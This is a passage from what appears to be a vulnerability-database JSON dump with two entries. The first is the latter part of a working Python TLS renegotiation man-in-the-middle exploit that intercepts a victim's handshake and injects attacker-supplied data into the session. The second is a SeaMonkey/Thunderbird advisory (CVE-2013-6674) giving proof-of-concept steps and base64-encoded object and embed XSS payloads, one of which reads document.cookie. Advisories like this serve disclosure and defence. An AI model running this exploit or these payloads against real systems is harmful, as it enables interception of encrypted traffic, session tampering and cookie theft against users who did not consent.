threading.Thread.setName))\r\n\r\ndef forward(sock1, sock2):\r\n    sock1.settimeout(1.0)\r\n    while True:\r\n        try:\r\n            data = sock1.recv(4096)\r\n            if not data:\r\n                return\r\n            sock2.send(data)\r\n        except socket.error, ex_error:\r\n            if ex_error[0] == 104: # Connection reset by peer\r\n                return\r\n        except socket.timeout, ex_timeout:\r\n            pass\r\n\r\n\r\nclass MessageWrapper(object):\r\n    def __init__(self, version = (3, 1), ssl2 = False):\r\n        self.contentType = tlslite.messages.ContentType.handshake\r\n        self.ssl2 = ssl2\r\n        self.client_version = version\r\n\r\n    def setType(self, type):\r\n        self.contentType = type\r\n\r\n    def addBytes(self, bytes):\r\n        self.bytes = bytes\r\n\r\n    def write(self, trial=False):\r\n        if trial:\r\n            raise Exception(&#39;Unsupported&#39;)\r\n        return array.array(&#39;B&#39;, self.bytes)\r\n\r\ndef send_record(sock, msg_type, version_major, version_minor, record):\r\n    msg = struct.pack(&#39;!BBBH&#39;, msg_type, version_major, version_minor, len(record))\r\n    if type(record) != str:\r\n        msg += record.tostring()\r\n    else:\r\n        msg += record\r\n    sock.send(msg)\r\n\r\ndef send_encapsulated(sslsock, type, messagebytes, version = (3, 1)):\r\n    msg = MessageWrapper(version)\r\n    msg.addBytes(struct.unpack(&#39;B&#39;*len(messagebytes), messagebytes))\r\n    msg.setType(type)\r\n    for dummy in sslsock._sendMsg(msg, True):\r\n        pass\r\n\r\ndef decrypt_record(sslsock, type, recordbytes):\r\n    for result in sslsock._decryptRecord(type, array.array(&#39;B&#39;, recordbytes)):\r\n        pass\r\n    return result\r\n\r\ndef recv_record(sock):\r\n    try:\r\n        header = sock.recv(5)\r\n        if not header:\r\n            return None, None, None, None\r\n        msg_type, msg_version_major, msg_version_minor, msg_length = struct.unpack(&#39;!BBBH&#39;, header)\r\n        record = &#39;&#39;\r\n        while len(record) != msg_length:\r\n            record += sock.recv(msg_length - len(record))\r\n        return msg_type, msg_version_major, msg_version_minor, record\r\n    except socket.error, ex:\r\n        if ex[0] == 104: # Connection reset by peer\r\n            return\r\n\r\ndef recv_clienthello(sock):\r\n    header_bytes = []\r\n    header_bytes.append(sock.recv(1))\r\n    header_bytes[0] = struct.unpack(&#39;!B&#39;, header_bytes[0])[0]\r\n    if header_bytes[0] & 0x80:\r\n        # Version 2.0 Client &#34;Record Layer&#34;\r\n        header_bytes.append(sock.recv(1))\r\n        header_bytes[1] = struct.unpack(&#39;!B&#39;, header_bytes[1])[0]\r\n        msg_length = (header_bytes[0] & 0x7f) &#60;&#60; 8 | header_bytes[1]\r\n        msg_version_major = 2\r\n        msg_version_minor = 0\r\n        msg_type = tlslite.constants.ContentType.handshake\r\n        record = sock.recv(msg_length)\r\n    else:\r\n        header = sock.recv(4)\r\n        msg_type = header_bytes[0]\r\n        msg_version_major, msg_version_minor, msg_length = struct.unpack(&#39;!BBH&#39;, header)\r\n        record = sock.recv(msg_length)\r\n\r\n    return msg_type, msg_version_major, msg_version_minor, record\r\n\r\ndef send_hello_request(sock):\r\n    sock.send(&#34;\\x16&#34;            # Record Layer: Handshake Message\r\n             +&#34;\\x03\\x01&#34;        # Record Layer Version: TLS 1.0\r\n             +&#34;\\x00\\x04&#34;        # Record Layer Length: 4\r\n             +&#34;\\x00&#34;            # Handshake Message Type: Hello Request\r\n             +&#34;\\x00\\x00\\x00&#34;)   # Handshake Message Length: 0\r\n\r\ndef send_protocol_version_alert(sock):\r\n    sock.send(&#34;\\x15&#34;            # Record Layer: Alert&#34;\r\n             +&#34;\\x03\\x01&#34;        # Record Layer Version: TLS 1.0\r\n             +&#34;\\x00\\x02&#34;        # Record Layer Length: 2\r\n             +&#34;\\x00&#34;            # Alert Message: fatal\r\n             +&#34;\\x46&#34;)           # Alert Message: protocol version\r\n\r\n\r\ndef handle_victim(victim, options, mitmcount):\r\n\r\n    if options.one_shot and mitmcount != 0:\r\n        print threading.current_thread().name, &#39;--one-shot specified and initial connection already handled, forwarding only&#39;\r\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        try:\r\n            sock.connect(options.target)\r\n            print threading.current_thread().name, &#39;Connected to target %s:%u&#39; % options.target\r\n        except socket.error, ex:\r\n            print threading.current_thread().name, &#39;Couldn\\&#39;t connect to target %s:%u&#39; % options.target\r\n            print threading.current_thread().name, &#39;Error code %u, \\&#39;%s\\&#39;&#39; % (ex[0], ex[1])\r\n            sys.exit(1)\r\n\r\n        t1 = threading.Thread(target=forward, args=(sock, victim))\r\n        t1.start()\r\n\r\n        t2 = threading.Thread(target=forward, args=(victim, sock))\r\n        t2.start()\r\n\r\n        t1.join()\r\n        sock.close()\r\n\r\n        t2.join()\r\n        victim.close()\r\n        return\r\n\r\n    # obtain initial &#34;client hello&#34; message\r\n    msg_type, msg_version_major, msg_version_minor, hello_msg = recv_clienthello(victim)\r\n    if msg_version_major == 2:\r\n        print threading.current_thread().name, &#34;client sent SSLv2 client hello message, exiting thread&#34;\r\n        return\r\n\r\n    tls_version = (msg_version_major, msg_version_minor)\r\n    type, length, version_major, version_minor, random, session_id_length = struct.unpack(&#39;!B3sBB32sB&#39;, hello_msg[:39])\r\n    resume_session = (session_id_length != 0)\r\n    if resume_session:\r\n        print threading.current_thread().name, &#34;client attempting to resume session&#34;\r\n\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    try:\r\n        sock.connect(options.target)\r\n        print threading.current_thread().name, &#39;Connected to target %s:%u&#39; % options.target\r\n    except socket.error, ex:\r\n        print threading.current_thread().name, &#39;Couldn\\&#39;t connect to target %s:%u&#39; % options.target\r\n        print threading.current_thread().name, &#39;Error code %u, \\&#39;%s\\&#39;&#39; % (ex[0], ex[1])\r\n        sys.exit(1)\r\n\r\n\r\n    sslsock = tlslite.api.TLSConnection(sock)\r\n    handshake_settings = tlslite.HandshakeSettings.HandshakeSettings()\r\n    handshake_settings.minVersion = tls_version\r\n    handshake_settings.maxVersion = tls_version\r\n    sslsock.handshakeClientCert(settings = handshake_settings)\r\n\r\n    # inject prefix\r\n    sslsock.write(options.inject)\r\n    print threading.current_thread().name, &#39;Injected %s&#39; % repr(options.inject)\r\n\r\n    # send original &#34;client hello&#34; message over the encrypted channel\r\n    send_encapsulated(sslsock, 22, hello_msg, tls_version)\r\n\r\n    # now receive serveral TLS messages from the server, decrypt them, and forward\r\n    # them to the client, until the server sends &#34;server hello done&#34;\r\n    # these messages include &#34;server hello&#34;, &#34;certificate&#34;, &#34;server key exchange&#34;,\r\n    # unless the client is trying to resume a previous session\r\n    print threading.current_thread().name, &#34;about to receive server handshake messages&#34;\r\n    server_handshake_done = False\r\n    while not server_handshake_done:\r\n        msg_type, msg_version_major, msg_version_minor, result = recv_record(sslsock.sock)\r\n        if result:\r\n            result = decrypt_record(sslsock, msg_type, result)\r\n            send_record(victim, msg_type, msg_version_major, msg_version_minor, result)\r\n            if result[0] == 0x0e: # server hello done - should terminate handshake\r\n                server_handshake_done = True\r\n            elif resume_session and msg_type == 0x14: # change cipher spec - probably irrelevant\r\n                server_handshake_done = True\r\n        else:\r\n            print threading.current_thread().name, &#39;receive from server failed, exiting thread&#39;\r\n            return\r\n    print threading.current_thread().name, &#34;server handshake done&#34;\r\n\r\n\r\n    # now its the the client&#39;s turn to send some messages, e.g.\r\n    # &#34;client key exchange&#34; and &#34;change cipher spec&#34;\r\n    print threading.current_thread().name, &#34;about to receive client handshake messages&#34;\r\n    handshake_finished = False\r\n    while not handshake_finished:\r\n        msg_type, msg_version_major, msg_version_minor, record = recv_record(victim)\r\n        print threading.current_thread().name, msg_type\r\n        send_encapsulated(sslsock, msg_type, record, tls_version)\r\n        if msg_type == 0x14: # change cipher spec\r\n            handshake_finished = True\r\n\r\n    print threading.current_thread().name, &#34;client handshake done&#34;\r\n\r\n    # message after &#34;change cipher spec&#34; must be sent in the &#34;clear&#34;\r\n    msg_type, msg_version_major, msg_version_minor, record = recv_record(victim)\r\n    send_record(sslsock.sock, msg_type, msg_version_major, msg_version_minor, record)\r\n\r\n    # server should now send &#34;change cipher spec&#34; message, we decrypt and send that to the victim\r\n    msg_type, msg_version_major, msg_version_minor, record = recv_record(sslsock.sock)\r\n    result = decrypt_record(sslsock, msg_type, record)\r\n    send_record(victim, msg_type, msg_version_major, msg_version_minor, result)\r\n\r\n    # finalize handshake\r\n    msg_type, msg_version_major, msg_version_minor, record = recv_record(sslsock.sock)\r\n    if record:\r\n        send_record(victim, msg_type, msg_version_major, msg_version_minor, record)\r\n    else:\r\n        sslsock.sock.close()\r\n        victim.close()\r\n        del sslsock\r\n        return\r\n\r\n\r\n\r\n    # the rest is just forwarding TLS records between both parties,\r\n    # which we cannot interfere with anymore, apart from dropping server\r\n    # responses\r\n    if options.drop:\r\n        sslsock.sock.close()\r\n        del sslsock\r\n    else:\r\n        t1 = threading.Thread(target=forward, args=(sslsock.sock, victim))\r\n        t1.start()\r\n\r\n    t2 = threading.Thread(target=forward, args=(victim, sslsock.sock))\r\n    t2.start()\r\n\r\n    if not options.drop:\r\n        t1.join()\r\n        sslsock.sock.close()\r\n\r\n    t2.join()\r\n    victim.close()\r\n\r\n\r\n\r\nif __name__ == &#34;__main__&#34;:\r\n    parser = optparse.OptionParser()\r\n    parser.add_option(&#39;-l&#39;, &#39;--listen&#39;, dest=&#39;listen_port&#39;, help=&#39;port to listen on&#39;, metavar=&#39;PORT&#39;, type=&#39;int&#39;, default=8443)\r\n    parser.add_option(&#39;-b&#39;, &#39;--bind&#39;, dest=&#39;bind_address&#39;, help=&#39;address to bind to&#39;, metavar=&#39;ADDRESS&#39;, default=&#39;0.0.0.0&#39;)\r\n    parser.add_option(&#39;-t&#39;, &#39;--target&#39;, dest=&#39;target&#39;, help=&#39;host and port to connect to&#39;, metavar=&#39;HOST:PORT&#39; )\r\n    parser.add_option(&#39;-i&#39;, &#39;--inject&#39;, dest=&#39;inject&#39;, help=&#39;string to inject&#39;, metavar=&#39;DATA&#39;)\r\n    parser.add_option(&#39;&#39;, &#39;--inject-file&#39;, dest=&#39;inject_file&#39;, help=&#39;inject data from a file&#39;, metavar=&#39;FILE&#39;)\r\n    parser.add_option(&#39;&#39;, &#39;--inject-base64&#39;, dest=&#39;inject_base64&#39;, help=&#39;string to inject, base64-encoded&#39;, metavar=&#39;DATA&#39;)\r\n    parser.add_option(&#39;-o&#39;, &#39;--one-shot&#39;, dest=&#39;one_shot&#39;, action=&#39;store_true&#39;, help=&#39;only mitm the first connection attempt, forward all other connections&#39;)\r\n    parser.add_option(&#39;-d&#39;, &#39;--drop-responses&#39;, dest=&#39;drop&#39;, action=&#34;store_true&#34;, default=False, help=&#39;drop server responses after renegotiating&#39;)\r\n\r\n    (options, args) = parser.parse_args()\r\n\r\n    if len([i for i in (options.inject, options.inject_file, options.inject_base64) if i]) != 1:\r\n        print &#39;Exactly one injection option must be specified&#39;\r\n        sys.exit(1)\r\n\r\n    if options.inject_file:\r\n        try:\r\n            options.inject = open(options.inject_file, &#39;r&#39;).read()\r\n        except IOError, ex:\r\n            print ex\r\n            sys.exit(1)\r\n\r\n    if options.inject_base64:\r\n        import base64\r\n        try:\r\n            options.inject = base64.decodestring(options.inject_base64)\r\n        except base64.binascii.Error, ex:\r\n            print &#39;Error decoding base64 data: %s&#39; % ex\r\n            sys.exit(1)\r\n\r\n\r\n    if not options.listen_port or \\\r\n       not options.bind_address or \\\r\n       not options.target or \\\r\n       not options.inject:\r\n        parser.print_help()\r\n        sys.exit(1)\r\n\r\n    target = options.target.split(&#39;:&#39;)\r\n    if len(target)==2:\r\n        try:\r\n            target[1] = int(target[1])\r\n        except ValueError:\r\n            target[1] = None\r\n    if len(target)!=2 or not target[0] or not target[1]:\r\n        print &#39;Target \\&#39;%s\\&#39; not in format HOST:PORT&#39; % options.target\r\n        sys.exit(1)\r\n\r\n    options.target = tuple(target)\r\n\r\n    try:\r\n        listensocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        listensocket.bind((options.bind_address, options.listen_port))\r\n        print &#39;Listening on %s:%u&#39; % (options.bind_address, options.listen_port)\r\n    except socket.error, ex:\r\n        print &#39;Couldn\\&#39;t listen on %s:%u&#39; % (options.bind_address, options.listen_port)\r\n        print &#39;Error code %u, \\&#39;%s\\&#39;&#39; % (ex[0], ex[1])\r\n        sys.exit(1)\r\n\r\n    listensocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\r\n    listensocket.listen(5)\r\n\r\n    mitmcount = 0\r\n\r\n    while True:\r\n        try:\r\n            victim, victimaddr = listensocket.accept()\r\n            print &#39;New connection from %s:%u&#39; % victimaddr\r\n\r\n            threading.Thread(target=handle_victim, args=(victim, options, mitmcount)).start()\r\n            mitmcount += 1\r\n\r\n        except KeyboardInterrupt, ex:\r\n            print &#39;\\nAborted by user, exiting...&#39;\r\n            listensocket.close()\r\n            sys.exit(1)\r\n\r\n\n                              ",
            "cvss": {
                "score": 5.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:67231"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2014-01-29T00:00:00",
            "published": "2014-01-29T00:00:00",
            "id": "VULNERLAB:967",
            "href": "http://www.vulnerability-lab.com/get_content.php?id=967",
            "title": "Mozilla SeaMonkey - Filter Bypass & Persistent Vulnerability",
            "type": "vulnerlab",
            "sourceData": "Document Title:\r\n===============\r\nMozilla SeaMonkey - Filter Bypass & Persistent Vulnerability\r\n\r\n\r\nReferences (Source):\r\n====================\r\nhttp://www.vulnerability-lab.com/get_content.php?id=967\r\nMozilla Bug Tracking ID: 881686\r\n\r\nhttp://www.vulnerability-lab.com/get_content.php?id=953\r\nMozilla Bug Tracking ID: 875818\r\n\r\nExclusive News: (Partners)  http://news.softpedia.com/news/Critical-Validation-and-Filter-Bypass-Vulnerability-Fixed-in-Thunderbird-420962.shtml\r\n\r\nhttp://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-6674\n\r\nCVE-ID:\r\n=======\r\nCVE-2013-6674\r\n\r\n\r\nRelease Date:\r\n=============\r\n2014-01-29\r\n\r\n\r\nVulnerability Laboratory ID (VL-ID):\r\n====================================\r\n967\r\n\r\n\r\nCommon Vulnerability Scoring System:\r\n====================================\r\n7.3\r\n\r\n\r\nProduct & Service Introduction:\r\n===============================\r\nSeaMonkey is a free and open source cross-platform Internet suite. It is the continuation of the former Mozilla Application Suite, \r\nbased on the same source code. The development of SeaMonkey is community-driven, in contrast to the Mozilla Application Suite, which \r\nuntil its last released version (1.7.13) was governed by the Mozilla Foundation. The new project-leading group is the SeaMonkey Council.\r\n\r\nSeaMonkey consists of a web browser (SeaMonkey Navigator), which is a descendant of the Netscape family, an e-mail and news client \r\nprogram (SeaMonkey Mail & Newsgroups, which shares code with Mozilla Thunderbird), an HTML editor (SeaMonkey Composer) and an IRC \r\nclient (ChatZilla). The software suite supports skins. It comes with two skins in the default installation, Modern and Classic.\r\n\r\nMail\r\nMail features includes support for multiple accounts {the documentation does not state how many}, junk mail detection, message filters, \r\nHTML message support, a dictionary, an address book, customizable labels, add-ons and mail views as well as integration with the rest of suite.\r\n\r\nComposer\r\nSeaMonkey Composer 2.16 running on Ubuntu 12.04. SeaMonkey Composer is a WYSIWYG HTML editor. Its main user interface features four tabs: \r\nNormal (WYSIWYG), HTML tags, HTML code, and browser preview. The generated code is HTML 4.01 Transitional. As of version 1.1.13, \r\nSeaMonkey Composer supports basic text formatting and styling, insertion of hyperlinks and images, and the creation of tables. It does \r\nnot support the addition of form elements (text fields, check boxes, and buttons). SeaMonkey Composer is scheduled to be updated with the \r\nrelease of KompoZer 0.8 which is currently under development.\r\n\r\n\r\nVendor Homepage: \thttp://www.mozilla.org\r\nProduct website: \thttp://www.seamonkey-project.org/releases/seamonkey2.17/\r\n\r\n\r\nAbstract Advisory Information:\r\n==============================\r\nThe Vulnerability Laboratory Research Team discovered a filter bypass and persistent validation web vulnerability in the Mozilla Seamonkey application.\r\n\r\n\r\nVulnerability Disclosure Timeline:\r\n==================================\r\n2013-05-10: Researcher Notification & Coordination (Ateeq ur Rehman Khan)\r\n2013-05-11: Vendor Notification (Mozilla Security Incident Team)\r\n2013-05-21: Vendor Response/Feedback (Mozilla Security Incident Team)\r\n2014-01-18: Vendor Fix/Patch (Mozilla Developer Team - Reward 1.500$ SWB)\r\n2014-01-27: Public Disclosure (Vulnerability Laboratory)\r\n\r\n\r\nDiscovery Status:\r\n=================\r\nPublished\r\n\r\n\r\nAffected Product(s):\r\n====================\r\nMozilla\r\nProduct: Seamonkey 2.17.1\r\n\r\n\r\nExploitation Technique:\r\n=======================\r\nRemote\r\n\r\n\r\nSeverity Level:\r\n===============\r\nHigh\r\n\r\n\r\nTechnical Details & Description:\r\n================================\r\nSince Seamonkey is using Mozilla Thunderbird at the backend for its mail client, It is prone to the same Persistent vulnerability \r\nthat i had reported earlier to Mozilla Security Team. \r\n\r\nI will include the details again in this advisory for your reference and ease. \r\n\r\nBasically , attaching a debugger with the seamonkey binary file, it was initially noticed that malicious java-script tags were being \r\nfiltered / blocked. By default, HTML tags like <script> and <iframe> are blocked in Seamonkey and get filtered immediately upon \r\ninsertion however, While drafting a new email message, attackers can easily bypass the current input filters by encoding their \r\npayloads with base64 encryption and using the <object> tag and insert malicious scripts / code eg. (script / frame) within the \r\nemails and send it to the victims. The exploit gets triggered once the victim decides to reply back and clicks on the `Reply` or `Forward` Buttons.\r\n\r\nAfter successfully bypassing the input filters, an attacker can inject persistent script code while writing a new email and send \r\nit to victims. Interestingly the payload gets filtered during the initial viewing mode however if the victim clicks on Reply or \r\nForward, the exploit gets executed successfully. For a POC i will be including multiple examples in this advisory for your review. \r\nI was able to run multiple scripts generating strange behaviour on the application which can be seen in the debugging errors \r\nwhich I have attached along with this report.\r\n\r\nThese sort of vulnerabilities can result in multiple attack vectors on the client end which may eventually result in complete \r\ncompromise of the end user system. The persistent code injection vulnerability is located within the main application. Exploitation \r\nof this persistent application vulnerability requires a low or medium user interaction. Successful exploitation of the vulnerability \r\nmay result in malicious script code being executed in the victims browser resulting in script code injection, persistent phishing, \r\nClient side redirects and similar client side attacks.\r\n\r\n\r\nVulnerable Service(s):\r\n[+] Seamonkey 2.17.1 - Latest Release \r\n\r\n\r\nVulnerable Section(s):\r\n[+] Compose (Compose in HTML)\r\n[+] Email Signature (Mail & Newsgroups Account Settings)\r\n[+] Attach File with Signature as HTML (Mail & Newsgroups Account Settings)\r\n\r\n\r\nProof of Concept (PoC):\r\n=======================\r\nThe validation and filter bypass vulnerability can be exploited by remote attackers without privileged application user account \r\nand direct user interaction. To demonstrate or reproduce the vulnerability follow the provided steps and information below.\r\n\r\nProof of Concept #1\r\n\r\na) Create a new email message (Compose in HTML)\r\nb) In the body text, insert new HTML tag with the POC \"Payload\"\r\nc) Send the email to the victim (your test email account)\r\nd) Open the new email in the victim browser and click Reply\r\ne) You should now see a Javascript Application popup window proving the existence of this vulnerability.\r\n\r\n\r\nProof of Concept #2\r\n\r\na) Goto Edit and then Mail & Newsgroups Account Settings\r\nb) Under the Signature Text, insert the Payload and enable 'Use HTML'\r\nc) Close the menu and Click on \"Compose\" (compose in HTML) to create a new email\r\nd) You should get a popup the moment new Email editor window opens up proving the existence of this vulnerability.\r\n\r\n\r\nProof of Concept #3\r\n\r\na) Create a new text file on your desktop (local computer), insert the POC payload and save it as test.html (HTML)\r\nb) Goto Edit and then Mail & Newsgroups Account Settings\r\nc) Below the Signature Text box, enable 'Attach the signature from a file instead'  \r\nd) Click Choose and select the 'test.html' file which you created in step a.\r\ne) Click on \"Compose\" (Compose in HTML) and you should be able to see the Javascript popup proving the existence of this vulnerability.\r\n\r\n\r\nPayload #1\r\n\r\n<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydChkT2NVbWVOdC5Db29LaWUpOzwvc2NyaXB0Pg==\"></object>\r\n\r\n\r\nPayload #2\r\n\r\n<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDov\r\nL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5\r\nL3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw\r\nIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlZ1bG5lcmFi\r\nbGUiKTs8L3NjcmlwdD48L3N2Zz4=\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>\r\n\r\n\r\n1.3 \r\nPOC Technical Description:\r\n\r\nHere, we used the data URI payload as a value assigned to the \u2018data\u2019 attribute of the \u2018object\u2019 tag. The <object> tag is used to include objects\r\nsuch as images, audio, videos, Java applets, ActiveX, PDF, and Flash. The \u2018data\u2019 attribute of the object tag defines a URL that refers to the\r\nobject\u2019s data. Data in the \"data:\" URI is encoded as a base64 string:\r\n\r\nBase64-encoded payload: PHNjcmlwdD5hbGVydCgiVnVsbmVyYWJsZSIpOzwvc2NyaXB0Pg==\r\n\r\nBase64-decoded payload: <script>alert(\"Vulnerable\");</script>\r\n\r\nWhen the browser loads the object tag, it loads an object (in our case, it\u2019s a javascript) assigned to its data attribute. This causes execution \r\nof our javascript. We were able to bypass the application blacklist filter because of the base64-encoded payload. \r\n\r\n\r\n\r\n\r\n\r\n2.0\r\nSeamonkey HTML Composer Preview - Input Filter Bypass Vulnerability\r\n\r\n\r\nDetails:\r\nBy default, html tags like <script> alert/prompt are being filtered in the Composer preview feature however, using the <object> and \r\nor <embed> tags and base64 encoded payloads it is possible to bypass the current filters and execute script code. Even though I \r\nnoticed that once you save it as an .html file, all normal payloads like <script>alert(1)</script> work. Its an HTML composer, \r\nmaybe its not allowed to filter any dangerous / malicious code requests by default and I am definitely not challenging that fact \r\nat all. I just felt its important to highlight the fact that if all other tags are being blocked in the preview, then this one \r\nactually bypasses the current Seamonkey Composer preview filters and still works. \r\n\r\n\r\nVulnerable Product(s):\r\n\t\t\t\t[+] Seamonkey 2.17.1 - Latest Release \r\n\r\nVulnerable Module(s):\r\n\t\t\t\t[+] Composer (CTRL+4)\r\n\r\nVulnerable Section(s):\r\n\t\t\t\t[+] HTML Source\r\n   \r\n\r\n2.1\r\n        \r\nProof of Concept:\r\n\r\na) Open New Seamonkey Composer Window \r\nb) Goto <HTML> Source\r\nc) Copy/Paste any one of the payloads mentioned under the \"Payload\" section, anywhere in the Code before </body> tag.\r\n\r\nExample Code that i used for this POC:\r\n\r\n<html>\r\n<head>\r\n<meta content=\"text/html; charset=ISO-8859-1\"\r\nhttp-equiv=\"Content-Type\">\r\n<title>testtesttest</title>\r\n</head>\r\n<body>\r\n<br>\r\n<h4> </h4>\r\n<h2> <object\r\ndata=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiVnVsbmVyYWJsZSIpOzwvc2NyaXB0Pg==\"></object>\r\n</h2>\r\n</body>\r\n</html>\r\n\r\nd) Click on Preview and you should be able to see a Javascript proving the existence of this Filter Bypass Vulnerability\r\n\r\n\r\nPayload #1\r\n<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiVnVsbmVyYWJsZSIpOzwvc2NyaXB0Pg==\"></object>\r\n\r\n\r\nPayload #2\r\n<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDov\r\nL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5\r\nL3hsaW5rIiB\r\n2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw\r\nIiBpZD0ieHNzIj\r\n48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlZ1bG5lcmFi\r\nbGUiKTs8L3Njcml\r\nwdD48L3N2Zz4=\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>\r\n\r\n\r\n2.3\r\n\r\nInteresting Raw Application Logs captured during the entire process of testing:\r\n\r\n\r\n[JavaScript Error: \"ReferenceError: dOcUmeNt is not defined\" {file: \"data:text/html;base64,\r\nPHNjcmlwdD5hbGVydChkT2NVbWVOdC5Db29LaWUpOzwvc2NyaXB0Pg==\" line: 1}]\r\n[JavaScript Error: \"TypeError: \r\nthis.tabbox is null\" {file: \"chrome://global/content/bindings/tabbox.xml\" line: 480}]\r\n[JavaScript Error: \"TypeError: t\r\nhis.tabbox is null\" {file: \"chrome://global/content/bindings/tabbox.xml\" line: 480}]\r\n[JavaScript Warning: \r\n\"The character encoding of a framed document was not declared. The document may appear different if viewed without the document framing it.\" \r\n{file: \"data:text/html;base64,\r\nPHNjcmlwdD5hbGVydChkT2NVbWVOdC5Db29LaWUpOzwvc2NyaXB0Pg==\" line: 0}]\r\n[JavaScript Warning: \r\n\"The character encoding of a framed document was not declared. The document may appear different if viewed without the document framing it.\" \r\n{file: \"data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==\" line: 0}]\r\n[JavaScript Error: \"TypeError: this.tabbox is null\" {file: \"chrome://global/content/bindings/tabbox.xml\" line: 480}]\r\n[JavaScript Error: \"TypeError: this.tabbox is null\" {file: \"chrome://global/content/bindings/tabbox.xml\" line: 480}]\r\n[JavaScript Error: \"TypeError: this.tabbox is null\" {file: \"chrome://global/content/bindings/tabbox.xml\" line: 480}]\r\n[JavaScript Warning: \"The character encoding of a framed document was not declared. The document may appear different \r\nif viewed without the document framing it.\" {file: \"data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==\" line: 0}]\r\n[JavaScript Error: \"TypeError: this.tabbox is null\" {file: \"chrome://global/content/bindings/tabbox.xml\" line: 480}]\r\n[JavaScript Warning: \"The character encoding of a framed document was not declared. The document may appear different \r\nif viewed without the document framing it.\" {file: \"data:text/html;base64,PHNjcmlwdD5hbGVydCgiVnVsbmVyYWJsZSIpOzwvc2NyaXB0Pg==\" line: 0}]\r\nModLoad: 6fcd0000 6fce2000   C:\\Windows\\SysWOW64\\dhcpcsvc.DLL\r\nModLoad: 6fcc0000 6fccd000   C:\\Windows\\SysWOW64\\dhcpcsvc6.DLL\r\n[JavaScript Error: \"TypeError: this.tabbox is null\" {file: \"chrome://global/content/bindings/tabbox.xml\" line: 480}]\r\n[JavaScript Warning: \"The character encoding of a framed document was not declared. The document may appear different if \r\nviewed without the document framing it.\" {file: \"data:text/html;base64,PHNjcmlwdD5hbGVydCgiVnVsbmVyYWJsZSIpOzwvc2NyaXB0Pg==\" line: 0}]\r\n[JavaScript Error: \r\n\"TypeError: this.tabbox is null\" {file: \"chrome://global/content/bindings/tabbox.xml\" line: 480}]\r\n[JavaScript Warning: \r\n\"Unknown property '-moz-border-radius-bottomleft'.  Declaration dropped.\" {file: \"https://www.google.com/search?q=a%2520%2F%3E%22%3Ch1%3E\r\njakjbsf%3C%2Fh1%3E&ie=utf-8&oe=utf-8&aq=\r\nt&rls=org.mozilla:en-US:unofficial&client=seamonkey-a\" line: 1}]\r\n[JavaScript Warning: \"Unknown property '-moz-border-radius-topleft'.  Declaration dropped.\" {file: \"https://www.google.com/search?q=\r\na%2520%2F%3E%22%3Ch1%3Ejakjbsf%3C%2Fh1%3E&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:unofficial&client=seamonkey-a\" line: 1}]\r\n[JavaScript Warning: \"Unknown property '-moz-border-radius-topright'.  Declaration dropped.\" {file: \"https://www.google.com\r\n/search?q=a%2520%2F%3E%22%3Ch1%3Ejakjbsf%3C%2Fh1%3E&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:unofficial&client=seamonkey-a\" line: 1}]\r\n[JavaScript Warning: \"Unknown property '-moz-border-radius-bottomright'.  Declaration dropped.\" {file: \"https://www.google.com/search?q=a%2520%2F\r\n%3E%22%3Ch1%3Ejakjbsf%3C%2Fh1%3E&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:unofficial&client=seamonkey-a\" line: 1}]\r\n[JavaScript Warning: \"Error in parsing value for 'filter'.  Declaration dropped.\" {file: \"https://www.google.com/search?q=a%2520%2F%3E%22%3Ch1%3Ejakjbsf\r\n%3C%2Fh1%3E&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:unofficial&client=seamonkey-a\" line: 1}]\r\n[JavaScript Warning: \"Unknown property '-moz-border-radius'.  Declaration dropped.\" {file: \"https://www.google.com/search?q=a%2520%2F%3E%22%3Ch1%3Ejakjbsf\r\n%3C%2Fh1%3E&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:unofficial&client=seamonkey-a\" line: 1}]\r\n[JavaScript Warning: \"Unknown property '-moz-box-shadow'.  Declaration dropped.\" \r\n{file: \"https://www.google.com/search?q=a%2520%2F%3E%22%3Ch1%3Ejakjbsf%3C%2Fh1%3E&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:unofficial&client=seamonkey-a\" \r\nline: 1}]\r\n[JavaScript Warning: \"Unknown pseudo-class or pseudo-element '-ms-clear'.  Ruleset ignored due to bad selector.\" \r\n{file: 